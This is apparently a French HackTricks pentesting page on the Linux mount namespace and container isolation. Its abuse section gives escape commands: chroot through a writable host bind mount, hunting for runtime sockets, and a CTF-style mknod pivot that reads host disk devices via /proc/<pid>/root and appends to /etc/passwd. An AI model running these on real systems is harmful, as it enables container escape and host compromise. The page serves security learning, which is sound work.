# Namespace de montage

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Le namespace de montage contrôle la **table de montage** qu'un processus voit. C'est l'une des fonctionnalités d'isolation des conteneurs les plus importantes car le système de fichiers racine, les bind mounts, les tmpfs mounts, la vue procfs, l'exposition sysfs, et de nombreux mounts d'aide spécifiques au runtime sont tous exprimés via cette table de montage. Deux processus peuvent tous deux accéder à `/`, `/proc`, `/sys` ou `/tmp`, mais ce à quoi ces chemins correspondent dépend du mount namespace dans lequel ils se trouvent.

Du point de vue de la sécurité des conteneurs, le mount namespace fait souvent la différence entre "il s'agit d'un système de fichiers d'application soigneusement préparé" et "ce processus peut directement voir ou influencer le système de fichiers de l'hôte". C'est pourquoi les bind mounts, les volumes `hostPath`, les opérations de montage privilégiées et les expositions en écriture de `/proc` ou `/sys` tournent autour de ce namespace.

## Fonctionnement

Quand un runtime lance un container, il crée généralement un mount namespace neuf, prépare un système de fichiers racine pour le container, monte procfs et d'autres systèmes de fichiers d'aide selon les besoins, et ajoute ensuite éventuellement des bind mounts, des tmpfs mounts, des secrets, des config maps ou des host paths. Une fois que ce processus tourne à l'intérieur du namespace, l'ensemble des mounts qu'il voit est largement découplé de la vue par défaut de l'hôte. L'hôte peut toujours voir le véritable système de fichiers sous-jacent, mais le container voit la version assemblée pour lui par le runtime.

C'est puissant parce que cela permet au container de croire qu'il a son propre système de fichiers racine même si l'hôte gère toujours tout. C'est aussi dangereux parce que si le runtime expose le mauvais mount, le processus gagne soudainement une visibilité sur des ressources de l'hôte que le reste du modèle de sécurité n'avait peut‑être pas été conçu pour protéger.

## Laboratoire

Vous pouvez créer un mount namespace privé avec:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si vous ouvrez un autre shell en dehors de ce namespace et examinez la table des montages, vous verrez que le montage tmpfs n'existe que dans le namespace de montage isolé. C'est un exercice utile car il montre que l'isolation des montages n'est pas une théorie abstraite ; le noyau présente littéralement une table des montages différente au processus.
Si vous ouvrez un autre shell en dehors de ce namespace et examinez la table des montages, le montage tmpfs n'existera que dans le namespace de montage isolé.

Dans les containers, une comparaison rapide est :
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Le second exemple montre à quel point il est facile pour une configuration d'exécution de créer un énorme trou dans la frontière du système de fichiers.

## Utilisation à l'exécution

Docker, Podman, containerd-based stacks, and CRI-O s'appuient tous sur un mount namespace privé pour les containers normaux. Kubernetes s'appuie sur le même mécanisme pour les volumes, les projected secrets, les config maps et les montages `hostPath`. Les environnements Incus/LXC reposent également fortement sur les mount namespaces, notamment parce que les system containers exposent souvent des systèmes de fichiers plus riches et plus semblables à une machine que les application containers.

Cela signifie que lorsque vous examinez un problème de système de fichiers de conteneur, vous ne regardez généralement pas une bizarrerie isolée de Docker. Vous regardez un problème de mount-namespace et de configuration d'exécution exprimé via la plateforme qui a lancé la charge de travail.

## Mauvaises configurations

L'erreur la plus évidente et la plus dangereuse est d'exposer le système de fichiers racine de l'hôte ou un autre chemin sensible de l'hôte via un bind mount, par exemple `-v /:/host` ou un `hostPath` inscriptible dans Kubernetes. À ce stade, la question n'est plus « le conteneur peut-il s'échapper d'une manière ou d'une autre ? » mais plutôt « combien de contenu utile de l'hôte est déjà directement visible et modifiable ? » Un bind mount hôte inscriptible transforme souvent le reste de l'exploit en une simple question de placement de fichiers, de chroot, de modification de configuration ou de découverte de sockets runtime.

Un autre problème fréquent est d'exposer les `/proc` ou `/sys` de l'hôte de manière à contourner la vue plus sûre du conteneur. Ces systèmes de fichiers ne sont pas des mounts de données ordinaires ; ce sont des interfaces vers l'état du kernel et des processus. Si la charge de travail accède directement aux versions de l'hôte, bon nombre des hypothèses à la base du durcissement des containers cessent de s'appliquer proprement.

Les protections en lecture seule sont également importantes. Un système de fichiers racine en lecture seule ne sécurise pas magiquement un conteneur, mais il supprime une grande quantité d'espace de préparation pour un attaquant et rend plus difficiles la persistance, le placement de binaires auxiliaires et la falsification de configurations. À l'inverse, une racine inscriptible ou un bind mount hôte inscriptible donne à un attaquant de la marge pour préparer l'étape suivante.

## Abus

Lorsque le mount namespace est mal utilisé, les attaquants font généralement l'une des quatre choses suivantes. Ils **lisent des données de l'hôte** qui auraient dû rester en dehors du conteneur. Ils **modifient la configuration de l'hôte** via des bind mounts inscriptibles. Ils **montent ou remontent des ressources supplémentaires** si les capabilities et seccomp le permettent. Ou ils **accèdent à des sockets puissants et à des répertoires d'état runtime** qui leur permettent de demander davantage d'accès à la plateforme de conteneurs elle-même.

Si le conteneur peut déjà voir le système de fichiers de l'hôte, le reste du modèle de sécurité change immédiatement.

Lorsque vous suspectez un bind mount hôte, confirmez d'abord ce qui est disponible et s'il est inscriptible :
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si le système de fichiers racine de l'hôte est monté en lecture-écriture, l'accès direct à l'hôte est souvent aussi simple que :
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si l'objectif est un accès privilégié au runtime plutôt que de chrooter directement, énumérez les sockets et l'état runtime :
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` est présent, testez également si de nouveaux montages peuvent être créés depuis l'intérieur du conteneur :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemple complet : pivot `mknod` à deux shells

Un chemin d'abus plus spécialisé apparaît lorsque l'utilisateur root du container peut créer des block devices, que le host et le container partagent une user identity de manière utile, et que l'attaquant dispose déjà d'un low-privilege foothold sur le host. Dans cette situation, le container peut créer un device node tel que `/dev/sda`, et l'utilisateur host low-privilege peut ensuite le lire via `/proc/<pid>/root/` pour le process correspondant du container.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Depuis l'hôte, en tant qu'utilisateur à faible privilège correspondant après avoir localisé le PID du shell du conteneur :
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La leçon importante n'est pas la recherche exacte de chaînes pour un CTF. Il s'agit que l'exposition du mount-namespace via `/proc/<pid>/root/` peut permettre à un utilisateur du host de réutiliser des device nodes créés par le container même lorsque la cgroup device policy empêchait leur utilisation directe à l'intérieur du container lui‑même.

## Vérifications

Ces commandes servent à vous montrer la vue du système de fichiers dans laquelle le processus courant vit réellement. L'objectif est de repérer des mounts provenant du host, des chemins sensibles en écriture, et tout élément qui paraît plus étendu qu'un root filesystem de container d'application normal.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Ce qui est intéressant ici :

- Les bind mounts provenant de l'hôte, en particulier `/`, `/proc`, `/sys`, les répertoires d'état runtime ou les emplacements de sockets, doivent ressortir immédiatement.
- Les montages inattendus en lecture-écriture (read-write) sont généralement plus importants qu'un grand nombre de montages auxiliaires en lecture seule (read-only).
- `mountinfo` est souvent le meilleur endroit pour voir si un chemin est réellement dérivé de l'hôte ou supporté par un overlay.

Ces vérifications établissent **quelles ressources sont visibles dans ce namespace**, **lesquelles proviennent de l'hôte**, et **lesquelles sont modifiables ou sensibles en termes de sécurité**.
{{#include ../../../../../banners/hacktricks-training.md}}
